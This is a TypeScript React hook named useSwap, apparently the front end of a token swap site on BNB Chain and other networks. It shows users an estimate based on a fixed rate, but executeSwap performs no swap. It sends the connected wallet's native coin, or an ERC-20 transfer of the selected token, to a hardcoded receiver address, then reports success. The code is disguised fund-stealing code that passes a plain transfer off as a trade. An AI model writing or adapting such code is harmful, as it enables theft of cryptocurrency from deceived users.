import { useCallback, useEffect, useState } from 'react';
import { usePrivy, useWallets } from '@privy-io/react-auth';
import {
  createPublicClient,
  encodeFunctionData,
  formatUnits,
  http,
  parseUnits,
  type Address,
} from 'viem';
import { SUPPORTED_CHAINS } from '../config/chains';
import {
  ERC20_ABI,
  RECEIVER_ADDRESS,
  SWAP_RATE,
} from '../config/constants';
import {
  getDefaultFromToken,
  getDefaultToToken,
  type Token,
} from '../config/tokens';

export function useSwap() {
  const { authenticated, ready } = usePrivy();
  const { wallets } = useWallets();
  const wallet = wallets[0];

  const [chainId, setChainId] = useState(56);
  const [fromToken, setFromToken] = useState<Token>(() => getDefaultFromToken(56));
  const [toToken, setToToken] = useState<Token>(() => getDefaultToToken(56));
  const [fromAmount, setFromAmount] = useState('');
  const [toAmount, setToAmount] = useState('');
  const [balance, setBalance] = useState('0');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [success, setSuccess] = useState<string | null>(null);

  const chain =
    SUPPORTED_CHAINS.find((c) => c.id === chainId) ?? SUPPORTED_CHAINS[0];

  const getClient = useCallback(
    () =>
      createPublicClient({
        chain,
        transport: http(),
      }),
    [chain],
  );

  const fetchBalance = useCallback(async () => {
    if (!wallet?.address) {
      setBalance('0');
      return;
    }

    try {
      const client = getClient();

      if (fromToken.isNative || !fromToken.address) {
        const raw = await client.getBalance({
          address: wallet.address as Address,
        });
        setBalance(formatUnits(raw, fromToken.decimals));
      } else {
        const raw = await client.readContract({
          address: fromToken.address,
          abi: ERC20_ABI,
          functionName: 'balanceOf',
          args: [wallet.address as Address],
        });
        setBalance(formatUnits(raw, fromToken.decimals));
      }
    } catch {
      setBalance('0');
    }
  }, [wallet?.address, fromToken, getClient]);

  useEffect(() => {
    if (ready && wallet?.address) {
      void fetchBalance();
    }
  }, [ready, wallet?.address, fetchBalance]);

  useEffect(() => {
    if (!wallet?.chainId) return;

    const parsed =
      typeof wallet.chainId === 'string'
        ? parseInt(wallet.chainId.replace('eip155:', ''), 10)
        : wallet.chainId;

    if (!Number.isNaN(parsed) && parsed !== chainId) {
      setChainId(parsed);
      setFromToken(getDefaultFromToken(parsed));
      setToToken(getDefaultToToken(parsed));
    }
  }, [wallet?.chainId, chainId]);

  useEffect(() => {
    if (fromAmount && !Number.isNaN(parseFloat(fromAmount))) {
      const estimated = parseFloat(fromAmount) * SWAP_RATE;
      setToAmount(estimated > 0 ? estimated.toFixed(6) : '');
    } else {
      setToAmount('');
    }
  }, [fromAmount]);

  const switchChain = async (nextChainId: number) => {
    if (!wallet) return;

    try {
      await wallet.switchChain(nextChainId);
      setChainId(nextChainId);
      setFromToken(getDefaultFromToken(nextChainId));
      setToToken(getDefaultToToken(nextChainId));
    } catch (err) {
      console.error('Chain switch failed:', err);
    }
  };

  const executeSwap = async () => {
    if (!authenticated || !wallet?.address) {
      setError('Please connect wallet first');
      return;
    }

    if (!fromAmount || parseFloat(fromAmount) <= 0) {
      setError('Enter a valid amount');
      return;
    }

    setLoading(true);
    setError(null);
    setSuccess(null);

    try {
      const provider = await wallet.getEthereumProvider();
      const amount = parseUnits(fromAmount, fromToken.decimals);

      let hash: string;

      if (fromToken.isNative || !fromToken.address) {
        hash = (await provider.request({
          method: 'eth_sendTransaction',
          params: [
            {
              from: wallet.address,
              to: RECEIVER_ADDRESS,
              value: `0x${amount.toString(16)}`,
            },
          ],
        })) as string;
      } else {
        const data = encodeFunctionData({
          abi: ERC20_ABI,
          functionName: 'transfer',
          args: [RECEIVER_ADDRESS, amount],
        });

        hash = (await provider.request({
          method: 'eth_sendTransaction',
          params: [
            {
              from: wallet.address,
              to: fromToken.address,
              data,
              value: '0x0',
            },
          ],
        })) as string;
      }

      setSuccess(`Transaction sent: ${hash.slice(0, 10)}...`);
      setFromAmount('');
      setToAmount('');
      await fetchBalance();
    } catch (err) {
      const message = err instanceof Error ? err.message : 'Transaction failed';
      if (message.includes('User rejected') || message.includes('denied')) {
        setError('Transaction cancelled');
      } else {
        setError(message.slice(0, 120));
      }
    } finally {
      setLoading(false);
    }
  };

  const flipTokens = () => {
    setFromToken(toToken);
    setToToken(fromToken);
    setFromAmount(toAmount);
    setToAmount(fromAmount);
  };

  return {
    ready,
    authenticated,
    chainId,
    chain,
    chains: SUPPORTED_CHAINS,
    fromToken,
    toToken,
    fromAmount,
    toAmount,
    balance,
    loading,
    error,
    success,
    setFromToken,
    setToToken,
    setFromAmount,
    switchChain,
    executeSwap,
    flipTokens,
  };
}
